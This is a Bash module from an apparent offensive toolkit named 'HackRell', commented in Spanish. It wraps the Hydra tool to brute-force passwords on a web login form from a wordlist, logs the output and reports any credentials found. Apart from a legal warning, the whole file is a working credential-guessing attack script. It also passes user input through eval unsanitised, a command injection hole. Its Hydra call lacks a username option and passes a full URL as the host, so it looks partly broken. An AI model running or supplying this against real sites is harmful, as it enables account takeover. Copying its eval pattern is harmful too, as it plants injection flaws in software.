#!/bin/bash

# HackRell - brute/brute_form.sh
# Realiza ataques de fuerza bruta a formularios web genéricos.

# Cargar utilidades de color y legal
source "$(dirname "$0")"/../utils/colors.sh
source "$(dirname "$0")"/../utils/legal.sh
source "$(dirname "$0")"/../utils/dict_manager.sh # Para la gestión de diccionarios

# Directorio para logs
LOG_DIR="/var/log/hackrell"
mkdir -p "$LOG_DIR" # Asegurarse de que el directorio de logs existe

function brute_form_menu() {
    check_root
    display_legal_warning
    clear
    print_banner "MÓDULO DE FUERZA BRUTA DE FORMULARIOS WEB"
    echo ""
    print_info "Este módulo realiza ataques de fuerza bruta a formularios web genéricos."
    print_warning "Los ataques de fuerza bruta pueden bloquear cuentas o IPs. Úselo solo en objetivos autorizados."
    echo ""

    read -p "${C_GREEN}Ingrese la URL del formulario (ej: http://example.com/login.php): ${C_RESET}" target_url
    read -p "${C_GREEN}Ingrese el método HTTP (GET/POST): ${C_RESET}" http_method
    read -p "${C_GREEN}Ingrese los datos del formulario (ej: user=^USER^&pass=^PASS^&submit=Login): ${C_RESET}" form_data
    read -p "${C_GREEN}Ingrese la cadena de error de login (ej: Invalid credentials): ${C_RESET}" error_string

    if [ -z "$target_url" ] || [ -z "$http_method" ] || [ -z "$form_data" ] || [ -z "$error_string" ]; then
        print_error "Todos los campos son obligatorios. Volviendo al menú principal."
        sleep 3
        return 1
    fi

    print_info "Seleccione un diccionario para el ataque:"
    echo "  1. Usar diccionario existente (especificar ruta)"
    echo "  2. Gestionar diccionarios (descargar/crear)"
    read -p "${C_GREEN}Seleccione una opción: ${C_RESET}" dict_choice

    local wordlist_file=""
    case $dict_choice in
        1)
            read -p "${C_GREEN}Ingrese la ruta al diccionario (ej: /usr/share/wordlists/rockyou.txt): ${C_RESET}" wordlist_file
            if [ ! -f "$wordlist_file" ]; then
                print_error "Diccionario no encontrado: $wordlist_file. Volviendo al menú principal."
                sleep 3
                return 1
            fi
            ;;
        2)
            display_dict_manager_menu
            print_info "Por favor, ingrese la ruta al diccionario después de gestionarlos:"
            read -p "${C_GREEN}Ruta al diccionario: ${C_RESET}" wordlist_file
            if [ ! -f "$wordlist_file" ]; then
                print_error "Diccionario no encontrado: $wordlist_file. Volviendo al menú principal."
                sleep 3
                return 1
            fi
            ;;
        *)
            print_error "Opción inválida. Volviendo al menú principal."
            sleep 3
            return 1
            ;;
    esac

    print_info "Iniciando ataque de fuerza bruta a formulario web con Hydra..."
    print_info "Objetivo: $target_url"
    print_info "Método: $http_method"
    print_info "Datos: $form_data"
    print_info "Diccionario: $wordlist_file"
    print_info "Los resultados se guardarán en ${LOG_DIR}/brute_form.log"
    echo ""

    local hydra_command="hydra -V -f -o ${LOG_DIR}/brute_form_found.txt -P $wordlist_file $target_url $http_method-form \"$form_data:$error_string\""

    eval "$hydra_command" 2>&1 | tee -a "$LOG_DIR/brute_form.log"

    if [ -s "${LOG_DIR}/brute_form_found.txt" ]; then
        print_success "¡Credenciales encontradas! Verifique ${LOG_DIR}/brute_form_found.txt"
    else
        print_warning "No se encontraron credenciales con el diccionario proporcionado."
    fi

    echo ""
    print_info "Presione [ENTER] para continuar."
    read -r
}

# Llamar a la función principal si el script se ejecuta directamente
if [[ "${BASH_SOURCE[0]}" == "$0" ]]; then
    brute_form_menu
fi

